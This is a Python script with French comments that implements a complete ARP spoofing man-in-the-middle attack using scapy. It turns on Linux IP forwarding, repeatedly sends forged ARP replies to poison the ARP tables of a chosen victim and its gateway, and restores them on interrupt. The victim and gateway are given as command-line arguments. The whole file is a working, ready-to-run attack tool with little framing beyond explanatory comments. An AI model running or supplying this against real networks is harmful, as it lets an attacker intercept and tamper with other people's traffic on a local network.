from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os

# === Fonction pour activer le routage IP (nécessaire pour intercepter et faire suivre les paquets entre victime <-> passerelle) ===
def _enable_linux_iproute():
    """Active le routage IP (ip_forward) sur les systèmes Linux."""
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read().strip() == "1":
            return  # déjà activé
    with open(file_path, "w") as f:
        print(1, file=f)  # on active le routage IP

def enable_ip_route(verbose=True):
    """Active le routage IP et affiche un message si verbose est True."""
    if verbose:
        print("[!] Activation du routage IP...")
    _enable_linux_iproute()
    if verbose:
        print("[!] Routage IP activé.")

# === Fonction utilitaire pour obtenir la MAC d’un hôte donné (envoie une requête ARP) ===
def get_mac(ip):
    """
    Envoie une requête ARP pour découvrir la MAC associée à une IP.
    Retourne None si aucun périphérique ne répond.
    """
    # Requête ARP encapsulée dans une trame Ethernet vers broadcast
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
        timeout=3,
        verbose=0
    )
    if ans:
        return ans[0][1].src  # On retourne l’adresse MAC de la réponse
    return None

# === Envoie une fausse réponse ARP à la victime ===
def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofe la cible en lui disant que nous (notre MAC) sommes l'IP de `host_ip`.
    Cela permet d'empoisonner sa table ARP.
    """
    # Récupère la vraie MAC de la victime
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Impossible de trouver la MAC de {target_ip}")
        return

    # Crée une fausse réponse ARP : "host_ip est à notre MAC"
    arp_response = ARP(
        pdst=target_ip,      # IP cible (la victime)
        hwdst=target_mac,    # MAC cible (MAC de la victime)
        psrc=host_ip,        # IP spoofée (ex: passerelle)
        op='is-at'           # C'est une réponse ARP ("host_ip est à...")
    )

    # Envoie du paquet sur le réseau
    send(arp_response, verbose=0)

    if verbose:
        # Affiche ce qui a été envoyé
        print(f"[+] Spoof envoyé à {target_ip} : {host_ip} is-at {ARP().hwsrc}")

# === Restaure les bonnes correspondances ARP (utile à la fin de l’attaque) ===
def restore(target_ip, host_ip, verbose=True):
    """
    Restaure les vraies correspondances IP <-> MAC dans la table ARP de la cible.
    Cela est fait pour nettoyer après l'attaque.
    """
    # On récupère les vraies adresses MAC des deux parties
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        print("[!] MAC manquante, impossible de restaurer.")
        return

    # Crée une réponse ARP légitime : "host_ip est à host_mac"
    arp_response = ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip,
        hwsrc=host_mac,
        op="is-at"
    )

    # Envoie la vraie info plusieurs fois pour s'assurer qu'elle est bien prise en compte
    send(arp_response, count=7, verbose=0)

    if verbose:
        print(f"[+] Table ARP restaurée pour {target_ip} : {host_ip} is-at {host_mac}")

# === Fonction principale qui gère le spoofing en boucle ===
def arpspoof(target, host, verbose=True):
    """
    Lance l'attaque de spoofing ARP en boucle.
    target = la victime
    host = la passerelle ou le serveur à intercepter
    """
    enable_ip_route(verbose)  # On active le routage IP si nécessaire

    try:
        while True:
            spoof(target, host, verbose)  # On fait croire à la victime qu’on est la passerelle
            spoof(host, target, verbose)  # Et on fait croire à la passerelle qu’on est la victime
            time.sleep(1)  # Attente entre les paquets (empêche les corrections ARP par le réseau)
    except KeyboardInterrupt:
        print("\n[!] CTRL+C détecté ! Restauration du réseau en cours...")
        restore(target, host)  # On restaure la victime
        restore(host, target)  # Puis la passerelle

# === Analyse des arguments passés au script ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script d'ARP spoofing (MITM)")
    parser.add_argument("target", help="IP de la victime à empoisonner")
    parser.add_argument("host", help="IP de la passerelle ou serveur (souvent la gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Activer les messages de debug")
    args = parser.parse_args()

    # Lancement de l'attaque
    arpspoof(args.target, args.host, args.verbose)
